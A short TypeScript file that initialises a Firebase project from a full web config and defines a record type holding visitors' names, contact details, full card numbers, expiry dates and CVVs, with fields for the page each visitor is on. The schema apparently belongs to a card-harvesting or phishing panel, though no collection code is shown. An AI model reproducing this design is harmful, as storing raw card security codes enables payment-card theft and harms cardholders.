import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDYRUrSwsxUV3axlWMLMVQX748WNgdfZeE",
  authDomain: "osagsdakz.firebaseapp.com",
  projectId: "osagsdakz",
  storageBucket: "osagsdakz.firebasestorage.app",
  messagingSenderId: "1076077760713",
  appId: "1:1076077760713:web:c39458236f2bd1549abd18",
  measurementId: "G-7JL5309VXB"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

